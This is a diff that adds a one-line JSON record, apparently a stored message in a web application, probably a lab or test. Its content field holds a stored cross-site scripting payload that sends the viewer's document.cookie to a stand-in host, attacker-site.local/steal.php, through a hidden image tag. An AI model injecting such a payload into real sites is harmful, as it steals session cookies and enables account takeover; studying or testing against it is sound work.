@@ -1,0 +1,1 @@
+[{"id":"67f27f6d52f68","user":"user1","content":"<script>\r\ndocument.write('<img src=\"http:\/\/attacker-site.local\/steal.php?cookie=' + document.cookie + '\" style=\"display:none\" \/>');\r\n<\/script>","time":"2025-04-06 15:19:41"}]
